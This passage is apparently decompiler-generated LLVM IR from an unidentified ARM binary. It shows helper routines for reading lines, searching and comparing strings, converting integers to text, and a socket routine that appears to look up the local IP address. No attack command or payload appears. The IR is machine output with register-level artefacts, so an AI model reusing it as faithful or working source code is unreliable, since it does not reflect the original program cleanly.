dec_label_pc_11410:                               ; preds = %dec_label_pc_113c8, %bb54
  %v1_11410 = icmp slt i32 %v1_113dc, 0
  %v0_11434 = load i32, i32* %sl.global-to-local, align 4
  %v2_11434 = icmp eq i32 %v0_11434, 0
  br i1 %v1_11410, label %dec_label_pc_11434, label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %dec_label_pc_11410
  br i1 %v2_11434, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_11418
  %v2_1141c = sub i32 0, %v2_1140011
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_11418, %bb65
  %v23_11420 = phi i32 [ %v2_1140011, %dec_label_pc_11418 ], [ %v2_1141c, %bb65 ]
  %v2_11420 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11420, i32* @r4, align 4
  ret i32 %v23_11420

dec_label_pc_11424:                               ; preds = %dec_label_pc_11344
  %v1_11424 = inttoptr i32 %v5_11324 to i8*
  %v2_11424 = load i8, i8* %v1_11424, align 1
  %v3_11424 = zext i8 %v2_11424 to i32
  store i32 %v3_11424, i32* %r4.global-to-local, align 4
  %v5_11424 = add i32 %v0_11324, 2
  store i32 %v5_11424, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1135c

dec_label_pc_11434:                               ; preds = %dec_label_pc_11410
  %.70 = select i1 %v2_11434, i32 2147483647, i32 -2147483648
  %v2_11440 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11440, i32* @r4, align 4
  ret i32 %.70

; uselistorder directives
  uselistorder i32 %v3_11408, { 1, 0 }
  uselistorder i1 %v9_113d0, { 1, 0, 2 }
  uselistorder i1 %v3_113d0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_113a0, { 1, 2, 0 }
  uselistorder i1 %v2_113a0, { 1, 0, 2 }
  uselistorder i32 %v1_11384, { 1, 2, 0 }
  uselistorder i32 %v1_113c4, { 1, 2, 0 }
  uselistorder i32 %v1_113dc, { 1, 0 }
  uselistorder i32 %v2_1140011, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_11374, { 1, 0, 2 }
  uselistorder i32 %v5_11324, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v3_11324, { 1, 0 }
  uselistorder i32 %v0_11324, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i8 9, { 4, 5, 2, 0, 1, 3 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %dec_label_pc_113c8, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1135c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11324, { 1, 2, 0, 3 }
}

define i32 @function_11444(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11444:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11444 = load i32, i32* @r4, align 4
  store i32 %v3_11444, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1145c

dec_label_pc_1145c:                               ; preds = %dec_label_pc_11488.dec_label_pc_1145c_crit_edge, %dec_label_pc_11444
  %v0_11460 = phi i32 [ %v0_11460.pre, %dec_label_pc_11488.dec_label_pc_1145c_crit_edge ], [ %arg3, %dec_label_pc_11444 ]
  %v0_1145c = phi i32 [ %v1_11474, %dec_label_pc_11488.dec_label_pc_1145c_crit_edge ], [ %tmp, %dec_label_pc_11444 ]
  %tmp12 = inttoptr i32 %v0_1145c to i32*
  %v5_11468 = call i32 @function_11cb8(i32 %v0_11460, i32* %tmp12, i32 1)
  %v7_1146c = icmp eq i32 %v5_11468, 1
  %v0_11470 = load i32, i32* @r4, align 4
  %v1_11474 = add i32 %v0_11470, 1
  store i32 %v1_11474, i32* @r4, align 4
  %v0_1147c = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_1146c, label %dec_label_pc_1147c, label %dec_label_pc_11494

dec_label_pc_1147c:                               ; preds = %dec_label_pc_1145c
  %v1_1147c = add i32 %v0_1147c, 1
  store i32 %v1_1147c, i32* %r5.global-to-local, align 4
  %v0_11480 = load i32, i32* %r7.global-to-local, align 4
  %v7_11484 = icmp sgt i32 %v0_11480, %v1_1147c
  br i1 %v7_11484, label %dec_label_pc_11488, label %dec_label_pc_11494

dec_label_pc_11488:                               ; preds = %dec_label_pc_1147c
  %v1_11488 = inttoptr i32 %v0_11470 to i8*
  %v2_11488 = load i8, i8* %v1_11488, align 1
  %v7_1148c = icmp eq i8 %v2_11488, 10
  br i1 %v7_1148c, label %dec_label_pc_11494, label %dec_label_pc_11488.dec_label_pc_1145c_crit_edge

dec_label_pc_11488.dec_label_pc_1145c_crit_edge:  ; preds = %dec_label_pc_11488
  %v0_11460.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1145c

dec_label_pc_11494:                               ; preds = %dec_label_pc_1145c, %dec_label_pc_11488, %dec_label_pc_1147c
  %v0_11494 = phi i32 [ %v1_1147c, %dec_label_pc_11488 ], [ %v1_1147c, %dec_label_pc_1147c ], [ %v0_1147c, %dec_label_pc_1145c ]
  %v2_11494 = icmp eq i32 %v0_11494, 0
  %v1_11498 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_11494, i32 0, i32 %v1_11498
  %v2_114a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_114a0, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_11474, { 1, 0 }
  uselistorder i8 10, { 2, 0, 3, 1 }
  uselistorder i32 (i32, i32*, i32)* @function_11cb8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11494, { 1, 2, 0 }
}

define i32 @function_114a4() local_unnamed_addr {
dec_label_pc_114a4:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_114a4 = load i32, i32* @r4, align 4
  store i32 16, i32* @r4, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_114b4 = call i32 @function_120c4()
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_114bc = inttoptr i32 %v0_114b4 to i32*
  store i32 0, i32* %v2_114bc, align 4
  %v0_114c8 = load i32, i32* %r6.global-to-local, align 4
  %v3_114cc = call i32 @function_123e0(i32 2, i32 2, i32 %v0_114c8)
  %v7_114d8 = icmp eq i32 %v3_114cc, -1
  store i32 %v3_114cc, i32* %r5.global-to-local, align 4
  %v2_114e4 = load i32, i32* @r4, align 4
  br i1 %v7_114d8, label %dec_label_pc_11534, label %dec_label_pc_114f8

dec_label_pc_114f8:                               ; preds = %dec_label_pc_114a4
  %v7_114e4 = shl i32 2056, %v2_114e4
  %v8_114e4 = or i32 %v7_114e4, 2056
  store i32 2, i32* %stack_var_-40, align 4
  %v3_11514 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_11514 = call i32 @function_1223c(i32 %v3_114cc, %sockaddr* %v3_11514, i32 %v2_114e4)
  %v2_1151c = ptrtoint i32* %stack_var_-24 to i32
  %v0_11520 = load i32, i32* %r5.global-to-local, align 4
  %v4_11524 = call i32 @function_12268(i32 %v0_11520, %sockaddr* %v3_11514, i32 %v2_1151c)
  %v1_1152c = call i32 @function_11af0(i32 %v0_11520)
  br label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %dec_label_pc_114a4, %dec_label_pc_114f8
  %v0_11534 = phi i32 [ %v0_114c8, %dec_label_pc_114a4 ], [ %v8_114e4, %dec_label_pc_114f8 ]
  store i32 %v3_114a4, i32* @r4, align 4
  ret i32 %v0_11534

; uselistorder directives
  uselistorder i32 %v3_114cc, { 1, 2, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_1223c, { 1, 0, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_123e0, { 24, 25, 22, 23, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_11534, { 1, 0 }
}

define i32 @function_11540(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11540:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_11544 = load i8, i8* %tmp, align 1
  %v2_11548 = icmp eq i8 %v3_11544, 0
  br i1 %v2_11548, label %bb, label %dec_label_pc_1155c

bb:                                               ; preds = %dec_label_pc_11540
  %v4_11544 = zext i8 %v3_11544 to i32
  br label %dec_label_pc_11570

dec_label_pc_1155c:                               ; preds = %dec_label_pc_11540
  br label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %dec_label_pc_11560, %dec_label_pc_1155c
  %v0_11560 = phi i32 [ %v1_11560, %dec_label_pc_11560 ], [ 0, %dec_label_pc_1155c ]
  %v1_11560 = add i32 %v0_11560, 1
  %v2_11564 = add i32 %v1_11560, %arg2
  %v3_11564 = inttoptr i32 %v2_11564 to i8*
  %v4_11564 = load i8, i8* %v3_11564, align 1
  %v2_11568 = icmp eq i8 %v4_11564, 0
  br i1 %v2_11568, label %dec_label_pc_11570, label %dec_label_pc_11560

dec_label_pc_11570:                               ; preds = %dec_label_pc_11560, %bb
  %v0_115b418 = phi i32 [ %v4_11544, %bb ], [ %v1_11560, %dec_label_pc_11560 ]
  %v0_115781 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_115781, 1
  br i1 %tmp27, label %dec_label_pc_115c4, label %dec_label_pc_11584

dec_label_pc_11584:                               ; preds = %dec_label_pc_11570, %dec_label_pc_11578.backedge
  %v0_1157c.in = phi i32 [ %v0_1157c, %dec_label_pc_11578.backedge ], [ %v0_115781, %dec_label_pc_11570 ]
  %v0_115a8 = phi i32 [ %v1_115a8., %dec_label_pc_11578.backedge ], [ 0, %dec_label_pc_11570 ]
  %v0_11584 = phi i32 [ %v5_11584, %dec_label_pc_11578.backedge ], [ %tmp20, %dec_label_pc_11570 ]
  %v0_1157c = add i32 %v0_1157c.in, -1
  %v1_11584 = inttoptr i32 %v0_11584 to i8*
  %v2_11584 = load i8, i8* %v1_11584, align 1
  %v3_11584 = zext i8 %v2_11584 to i32
  store i32 %v3_11584, i32* @lr, align 4
  %v5_11584 = add i32 %v0_11584, 1
  %v2_11588 = add i32 %v0_115a8, %arg2
  %v3_11588 = inttoptr i32 %v2_11588 to i8*
  %v4_11588 = load i8, i8* %v3_11588, align 1
  %v6_11588 = zext i8 %v4_11588 to i32
  %v1_1158c = add nsw i32 %v3_11584, -65
  %v1_11590 = add nsw i32 %v6_11588, -65
  %tmp35 = icmp ult i32 %v1_1158c, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_11584
  %v5_11598 = or i32 %v3_11584, 96
  store i32 %v5_11598, i32* @lr, align 4
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_11584, %bb28
  %v0_115a4 = phi i32 [ %v3_11584, %dec_label_pc_11584 ], [ %v5_11598, %bb28 ]
  %tmp36 = icmp ult i32 %v1_11590, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_115a0 = or i32 %v6_11588, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_115a4 = phi i32 [ %v6_11588, %bb29 ], [ %v5_115a0, %bb30 ]
  %v9_115a4 = icmp eq i32 %v0_115a4, %v1_115a4
  %v1_115a8 = add i32 %v0_115a8, 1
  %v1_115a8. = select i1 %v9_115a4, i32 %v1_115a8, i32 0
  br i1 %v9_115a4, label %dec_label_pc_115b4, label %dec_label_pc_11578.backedge

dec_label_pc_11578.backedge:                      ; preds = %bb31, %dec_label_pc_115b4
  %tmp32 = icmp slt i32 %v0_1157c, 1
  br i1 %tmp32, label %dec_label_pc_115c4, label %dec_label_pc_11584

dec_label_pc_115b4:                               ; preds = %bb31
  %v9_115b4 = icmp eq i32 %v0_115b418, %v1_115a8.
  br i1 %v9_115b4, label %dec_label_pc_115bc, label %dec_label_pc_11578.backedge

dec_label_pc_115bc:                               ; preds = %dec_label_pc_115b4
  %v2_115bc = sub i32 %v5_11584, %tmp20
  ret i32 %v2_115bc

dec_label_pc_115c4:                               ; preds = %dec_label_pc_11578.backedge, %dec_label_pc_11570
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_115a8., { 1, 0 }
  uselistorder i32 %v0_11584, { 1, 0 }
  uselistorder i32 %v0_115a8, { 1, 0 }
  uselistorder i8 %v3_11544, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder label %dec_label_pc_11578.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_11584, { 1, 0 }
}

define i32 @function_115cc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_115cc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_115cc = load i8, i8* %arg1, align 1
  %v2_115d0 = icmp eq i8 %v2_115cc, 0
  br i1 %v2_115d0, label %bb, label %dec_label_pc_115dc

bb:                                               ; preds = %dec_label_pc_115cc
  %v3_115cc = zext i8 %v2_115cc to i32
  br label %dec_label_pc_115f0

dec_label_pc_115dc:                               ; preds = %dec_label_pc_115cc
  br label %dec_label_pc_115e0

dec_label_pc_115e0:                               ; preds = %dec_label_pc_115e0, %dec_label_pc_115dc
  %v0_115e0 = phi i32 [ %v1_115e0, %dec_label_pc_115e0 ], [ 0, %dec_label_pc_115dc ]
  %v1_115e0 = add i32 %v0_115e0, 1
  %v2_115e4 = add i32 %v1_115e0, %tmp
  %v3_115e4 = inttoptr i32 %v2_115e4 to i8*
  %v4_115e4 = load i8, i8* %v3_115e4, align 1
  %v2_115e8 = icmp eq i8 %v4_115e4, 0
  br i1 %v2_115e8, label %dec_label_pc_115f0, label %dec_label_pc_115e0

dec_label_pc_115f0:                               ; preds = %dec_label_pc_115e0, %bb
  %v0_11614 = phi i32 [ %v3_115cc, %bb ], [ %v1_115e0, %dec_label_pc_115e0 ]
  %v1_115f0 = inttoptr i32 %arg2 to i8*
  %v2_115f0 = load i8, i8* %v1_115f0, align 1
  %v3_115f0 = zext i8 %v2_115f0 to i32
  %v2_115f4 = icmp eq i8 %v2_115f0, 0
  br i1 %v2_115f4, label %bb22, label %dec_label_pc_11600

bb22:                                             ; preds = %dec_label_pc_115f0
  store i32 %v3_115f0, i32* @r2, align 4
  br label %dec_label_pc_11614

dec_label_pc_11600:                               ; preds = %dec_label_pc_115f0
  br label %dec_label_pc_11604

dec_label_pc_11604:                               ; preds = %dec_label_pc_11604, %dec_label_pc_11600
  %v0_11604 = phi i32 [ %v1_11604, %dec_label_pc_11604 ], [ 0, %dec_label_pc_11600 ]
  %v1_11604 = add i32 %v0_11604, 1
  store i32 %v1_11604, i32* @r2, align 4
  %v2_11608 = add i32 %v1_11604, %arg2
  %v3_11608 = inttoptr i32 %v2_11608 to i8*
  %v4_11608 = load i8, i8* %v3_11608, align 1
  %v2_1160c = icmp eq i8 %v4_11608, 0
  br i1 %v2_1160c, label %dec_label_pc_11614, label %dec_label_pc_11604

dec_label_pc_11614:                               ; preds = %dec_label_pc_11604, %bb22
  %v0_116404 = phi i32 [ %v3_115f0, %bb22 ], [ %v1_11604, %dec_label_pc_11604 ]
  %v9_11614 = icmp eq i32 %v0_11614, %v0_116404
  br i1 %v9_11614, label %dec_label_pc_11640.preheader, label %dec_label_pc_11620

dec_label_pc_11640.preheader:                     ; preds = %dec_label_pc_11614
  %v2_116406 = icmp eq i32 %v0_11614, 0
  br i1 %v2_116406, label %dec_label_pc_11648, label %dec_label_pc_11628

dec_label_pc_11620:                               ; preds = %dec_label_pc_11628, %dec_label_pc_11614
  ret i32 0

dec_label_pc_11628:                               ; preds = %dec_label_pc_11638, %dec_label_pc_11640.preheader
  %v0_11640.in = phi i32 [ %v0_11640, %dec_label_pc_11638 ], [ %v0_11614, %dec_label_pc_11640.preheader ]
  %v0_1163c = phi i32 [ %v1_1163c, %dec_label_pc_11638 ], [ %arg2, %dec_label_pc_11640.preheader ]
  %v0_11638 = phi i32 [ %v1_11638, %dec_label_pc_11638 ], [ %tmp, %dec_label_pc_11640.preheader ]
  %v0_11640 = add i32 %v0_11640.in, -1
  %v1_11628 = inttoptr i32 %v0_11638 to i8*
  %v2_11628 = load i8, i8* %v1_11628, align 1
  %v3_11628 = zext i8 %v2_11628 to i32
  store i32 %v3_11628, i32* @r2, align 4
  %v1_1162c = inttoptr i32 %v0_1163c to i8*
  %v2_1162c = load i8, i8* %v1_1162c, align 1
  %v9_11630 = icmp eq i8 %v2_11628, %v2_1162c
  br i1 %v9_11630, label %dec_label_pc_11638, label %dec_label_pc_11620

dec_label_pc_11638:                               ; preds = %dec_label_pc_11628
  %v1_11638 = add i32 %v0_11638, 1
  %v1_1163c = add i32 %v0_1163c, 1
  %v2_11640 = icmp eq i32 %v0_11640, 0
  br i1 %v2_11640, label %dec_label_pc_11648, label %dec_label_pc_11628

dec_label_pc_11648:                               ; preds = %dec_label_pc_11638, %dec_label_pc_11640.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_11604, { 0, 1, 3, 2 }
  uselistorder i8 %v2_115cc, { 1, 0 }
}

define i32 @function_11650(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11650:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11650 = load i32, i32* @r4, align 4
  store i32 %v3_11650, i32* %stack_var_-28, align 4
  %v22_11650 = ptrtoint i32* %stack_var_-28 to i32
  %v0_11654 = load i32, i32* @r2, align 4
  store i32 %v0_11654, i32* %r8.global-to-local, align 4
  %v2_11654 = icmp eq i32 %v0_11654, 0
  store i1 %v2_11654, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_11654, label %dec_label_pc_11744, label %dec_label_pc_11664

dec_label_pc_11664:                               ; preds = %dec_label_pc_11650
  %v3_11664 = icmp eq i8 %arg1, 0
  store i1 %v3_11664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11664, label %.thread, label %dec_label_pc_11678

.thread:                                          ; preds = %dec_label_pc_11664
  %v4_1166c = inttoptr i32 %v0_11654 to i8*
  store i8 48, i8* %v4_1166c, align 1
  %v0_11670.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11670.pr.pr, label %.thread1, label %dec_label_pc_11678

.thread1:                                         ; preds = %.thread
  %v4_11670 = load i32, i32* %r8.global-to-local, align 4
  %v5_11670 = add i32 %v4_11670, 1
  %v6_11670 = inttoptr i32 %v5_11670 to i8*
  store i8 0, i8* %v6_11670, align 1
  %v0_11674.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11674.pr.pr, label %dec_label_pc_11744, label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %dec_label_pc_11664, %.thread, %.thread1
  %v7_1167c = icmp eq i32 %arg2, 10
  store i1 %v7_1167c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1167c, label %bb, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_11678
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_11678
  %tmp39 = icmp slt i8 %arg1, 0
  %phitmp = icmp eq i1 %tmp39, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_116a0

.thread4:                                         ; preds = %bb, %.thread21
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_116b0

dec_label_pc_116a0:                               ; preds = %bb
  %v2_116a0 = sub nsw i32 0, %tmp
  store i32 %v2_116a0, i32* %r4.global-to-local, align 4
  store i1 %v3_11664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11664, label %dec_label_pc_11750, label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_116a0, %.thread4
  %v0_116b810 = phi i32 [ %tmp, %.thread4 ], [ %v2_116a0, %dec_label_pc_116a0 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_116a0 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_116b4 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_116b4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_116b8

dec_label_pc_116b8:                               ; preds = %bb37, %dec_label_pc_116b0
  %v0_116b8 = phi i32 [ %v0_116dc, %bb37 ], [ %v0_116b810, %dec_label_pc_116b0 ]
  store i32 %v0_116b8, i32* %r0.global-to-local, align 4
  %v0_116bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116bc, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_116b8, 16777216
  %v1_116c0 = sdiv i32 %sext, 16777216
  %v3_116c0 = call i32 @function_11878(i32 %v1_116c0, i32 %v0_116bc)
  store i32 %v3_116c0, i32* %r0.global-to-local, align 4
  %v7_116c4 = icmp eq i32 %v3_116c0, 9
  store i1 %v7_116c4, i1* %cpsr_z.global-to-local, align 1
  %v1_116c8 = add i32 %v3_116c0, 48
  %v0_116cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116cc, i32* @r1, align 4
  %v7_116d0 = icmp sgt i32 %v3_116c0, 9
  %extract.t = trunc i32 %v1_116c8 to i8
  br i1 %v7_116d0, label %bb36, label %bb37

bb36:                                             ; preds = %dec_label_pc_116b8
  %v9_116d0 = add i32 %v3_116c0, 55
  %extract.t20 = trunc i32 %v9_116d0 to i8
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_116b8, %bb36
  %v0_116d8.off0 = phi i8 [ %extract.t, %dec_label_pc_116b8 ], [ %extract.t20, %bb36 ]
  %v0_116d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_116d4, i32* @r0, align 4
  %v2_116d8 = load i32, i32* %r7.global-to-local, align 4
  %v3_116d8 = inttoptr i32 %v2_116d8 to i8*
  store i8 %v0_116d8.off0, i8* %v3_116d8, align 1
  %v4_116d8 = load i32, i32* %r7.global-to-local, align 4
  %v5_116d8 = add i32 %v4_116d8, -1
  store i32 %v5_116d8, i32* %r7.global-to-local, align 4
  %v0_116dc = call i32 @function_11768()
  store i32 %v0_116dc, i32* %r0.global-to-local, align 4
  store i32 %v0_116dc, i32* %r4.global-to-local, align 4
  %v2_116e0 = icmp eq i32 %v0_116dc, 0
  store i1 %v2_116e0, i1* %cpsr_z.global-to-local, align 1
  %v0_116e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_116e4 = add i32 %v0_116e4, -1
  store i32 %v1_116e4, i32* %r6.global-to-local, align 4
  br i1 %v2_116e0, label %dec_label_pc_116ec, label %dec_label_pc_116b8

dec_label_pc_116ec:                               ; preds = %bb37
  %v0_116ec = load i32, i32* %sl.global-to-local, align 4
  %v2_116ec = icmp eq i32 %v0_116ec, 0
  store i1 %v2_116ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116ec, label %bb38, label %dec_label_pc_11754

bb38:                                             ; preds = %dec_label_pc_116ec
  store i32 %v0_116e4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_116f8

dec_label_pc_116f8:                               ; preds = %bb38, %dec_label_pc_11754
  %v1_11704 = phi i32 [ %v0_116e4, %bb38 ], [ %v1_116fc.pre, %dec_label_pc_11754 ]
  %v2_116f8 = ptrtoint i32* %stack_var_-62 to i32
  %v2_116fc = add i32 %v1_11704, %v2_116f8
  %v3_116fc = inttoptr i32 %v2_116fc to i8*
  %v4_116fc = load i8, i8* %v3_116fc, align 1
  %v6_116fc = zext i8 %v4_116fc to i32
  %v2_11700 = icmp eq i8 %v4_116fc, 0
  store i1 %v2_11700, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_116fc, i32* %r1.global-to-local, align 4
  br i1 %v2_11700, label %dec_label_pc_11728, label %dec_label_pc_1170c

dec_label_pc_1170c:                               ; preds = %dec_label_pc_116f8
  br label %dec_label_pc_11710

dec_label_pc_11710:                               ; preds = %dec_label_pc_11710, %dec_label_pc_1170c
  %v0_11710 = phi i32 [ %v1_11710, %dec_label_pc_11710 ], [ 0, %dec_label_pc_1170c ]
  %v1_11710 = add i32 %v0_11710, 1
  store i32 %v1_11710, i32* @r2, align 4
  %v2_11714 = add i32 %v1_11710, %v2_116fc
  %v3_11714 = inttoptr i32 %v2_11714 to i8*
  %v4_11714 = load i8, i8* %v3_11714, align 1
  %v2_11718 = icmp eq i8 %v4_11714, 0
  store i1 %v2_11718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11718, label %dec_label_pc_11720, label %dec_label_pc_11710

dec_label_pc_11720:                               ; preds = %dec_label_pc_11710
  %v7_11720 = icmp eq i32 %v0_11710, -2
  store i1 %v7_11720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11720, label %dec_label_pc_11744, label %dec_label_pc_11728

dec_label_pc_11728:                               ; preds = %dec_label_pc_11720, %dec_label_pc_116f8
  %v0_1173017 = phi i32 [ %v1_11710, %dec_label_pc_11720 ], [ %v6_116fc, %dec_label_pc_116f8 ]
  store i32 %v2_116fc, i32* %r0.global-to-local, align 4
  %v0_1172c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1172c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11730

dec_label_pc_11730:                               ; preds = %dec_label_pc_11730.dec_label_pc_11730_crit_edge, %dec_label_pc_11728
  %v2_1173c = phi i32 [ %v5_1173c, %dec_label_pc_11730.dec_label_pc_11730_crit_edge ], [ %v0_1172c, %dec_label_pc_11728 ]
  %v0_11734 = phi i32 [ %v0_11734.pre, %dec_label_pc_11730.dec_label_pc_11730_crit_edge ], [ %v2_116fc, %dec_label_pc_11728 ]
  %v0_11730 = phi i32 [ %v0_11730.pre, %dec_label_pc_11730.dec_label_pc_11730_crit_edge ], [ %v0_1173017, %dec_label_pc_11728 ]
  %v1_11730 = add i32 %v0_11730, -1
  store i32 %v1_11730, i32* @r2, align 4
  %v1_11734 = inttoptr i32 %v0_11734 to i8*
  %v2_11734 = load i8, i8* %v1_11734, align 1
  %v5_11734 = add i32 %v0_11734, 1
  store i32 %v5_11734, i32* %r0.global-to-local, align 4
  %v3_11738 = icmp eq i32 %v0_11730, 0
  store i1 %v3_11738, i1* %cpsr_z.global-to-local, align 1
  %v3_1173c = inttoptr i32 %v2_1173c to i8*
  store i8 %v2_11734, i8* %v3_1173c, align 1
  %v4_1173c = load i32, i32* %r1.global-to-local, align 4
  %v5_1173c = add i32 %v4_1173c, 1
  store i32 %v5_1173c, i32* %r1.global-to-local, align 4
  br i1 %v3_11738, label %dec_label_pc_11744, label %dec_label_pc_11730.dec_label_pc_11730_crit_edge

dec_label_pc_11730.dec_label_pc_11730_crit_edge:  ; preds = %dec_label_pc_11730
  %v0_11730.pre = load i32, i32* @r2, align 4
  %v0_11734.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11730

dec_label_pc_11744:                               ; preds = %dec_label_pc_11730, %dec_label_pc_11720, %.thread1, %dec_label_pc_11650
  %v0_11744 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11744, i32* %r0.global-to-local, align 4
  %v2_1174c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1174c, i32* @r4, align 4
  ret i32 %v0_11744

dec_label_pc_11750:                               ; preds = %dec_label_pc_116a0
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11754

dec_label_pc_11754:                               ; preds = %dec_label_pc_116ec, %dec_label_pc_11750
  %v1_11758 = phi i32 [ %v1_116e4, %dec_label_pc_116ec ], [ 32, %dec_label_pc_11750 ]
  %v2_11758 = add i32 %v1_11758, %v22_11650
  %v3_11760 = add i32 %v2_11758, -34
  %v4_11760 = inttoptr i32 %v3_11760 to i8*
  store i8 45, i8* %v4_11760, align 1
  %v1_116fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_116f8

; uselistorder directives
